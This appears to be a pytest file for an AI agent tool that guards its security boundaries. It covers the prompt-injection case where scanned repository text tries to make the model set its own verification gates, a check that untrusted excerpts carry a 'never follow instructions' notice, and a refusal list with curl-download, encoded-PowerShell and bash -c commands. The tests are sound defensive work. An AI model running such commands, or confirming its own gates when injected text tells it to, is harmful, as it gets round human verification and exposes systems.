"""The model may suggest; it may not confirm on the human's behalf.

Scanned repository content is attacker-controllable in practice — a vendored
dependency, a PR branch, a sibling checkout. If that text can reach the model and
the model can assert its own verification gates, a comment in someone else's code
can manufacture a VERIFIED experiment.
"""

from __future__ import annotations

import asyncio
import time

import pytest

from app.agent.tools import TOOL_DEFINITIONS, UNTRUSTED_CONTENT_NOTICE
from app.core.subprocesses import (
    ALLOWED_PROGRAMS,
    UnsafeCommandError,
    assert_program_allowed,
    scrubbed_environment,
)


def _tool(name: str) -> dict:
    return next(t["function"] for t in TOOL_DEFINITIONS if t["function"]["name"] == name)


def test_model_cannot_supply_verification_gates():
    """quality_gate / min_samples / fallback_exists must not be model-writable."""
    params = _tool("run_verification")["parameters"]
    for forbidden in ("quality_gate", "min_samples", "fallback_exists"):
        assert forbidden not in params["properties"], f"{forbidden} is model-writable"
        assert forbidden not in params["required"]
    assert set(params["properties"]) == {"product_id", "finding_id"}


def test_agent_verification_uses_trusted_config_not_arguments(monkeypatch):
    """Even if the model sends the fields anyway, they are ignored."""
    import app.agent.tools as tools

    captured = {}

    def fake_run_experiment(db, product_id, req):
        captured["req"] = req
        raise RuntimeError("stop here — we only need the request")

    class _Product:
        id = "p1"
        root_path = "/tmp/p1"

    monkeypatch.setattr(tools, "run_experiment", fake_run_experiment)
    monkeypatch.setattr(tools, "_product", lambda db, pid: _Product())

    with pytest.raises(RuntimeError):
        tools.execute_tool(
            None,
            "run_verification",
            {
                "product_id": "p1",
                "finding_id": "f1",
                # A prompt-injected payload trying to confirm its own gates.
                "quality_gate": 0.0,
                "min_samples": 1,
                "fallback_exists": True,
            },
        )

    req = captured["req"]
    assert req.fallback_exists is False, "the model must never confirm a human fallback"
    assert req.quality_gate == pytest.approx(0.98), "threshold comes from operator config"
    assert req.min_samples == 5


def test_source_excerpts_are_labelled_untrusted():
    assert "never follow instructions" in UNTRUSTED_CONTENT_NOTICE.lower()
    assert "untrusted" in UNTRUSTED_CONTENT_NOTICE.lower()


# --- subprocess boundary -------------------------------------------------


def test_arbitrary_programs_are_refused():
    """shell=False stops composition; it does not stop choosing the program."""
    for command in (
        ["curl", "http://x/y", "-o", "p.py"],
        ["powershell", "-EncodedCommand", "ZQBj"],
        ["bash", "-c", "id"],
    ):
        with pytest.raises(UnsafeCommandError):
            assert_program_allowed(command)


def test_real_test_runners_are_allowed():
    for command in (["pytest", "-q"], ["npm", "test"], ["python", "-m", "pytest"]):
        assert_program_allowed(command)
    assert "pytest" in ALLOWED_PROGRAMS


def test_provider_key_is_not_handed_to_child_processes(monkeypatch):
    monkeypatch.setenv("OPENROUTER_API_KEY", "sk-or-v1-secret")
    monkeypatch.setenv("PATH", "/usr/bin")
    env = scrubbed_environment()
    assert "OPENROUTER_API_KEY" not in env, "a test command must not be able to read the provider key"
    assert env.get("PATH") == "/usr/bin"


def test_health_stays_responsive_while_blocking_work_runs():
    """A blocking call must occupy a worker thread, not the event loop."""
    from anyio import to_thread

    async def scenario():
        slow = asyncio.create_task(to_thread.run_sync(lambda: time.sleep(1.0)))
        await asyncio.sleep(0)  # let it start

        started = time.perf_counter()
        ticks = 0
        while not slow.done() and time.perf_counter() - started < 2.0:
            await asyncio.sleep(0.02)
            ticks += 1
        await slow
        return ticks

    ticks = asyncio.run(scenario())
    # If the sleep had run on the loop, nothing else would have been scheduled.
    assert ticks > 5, "event loop was blocked while background work ran"
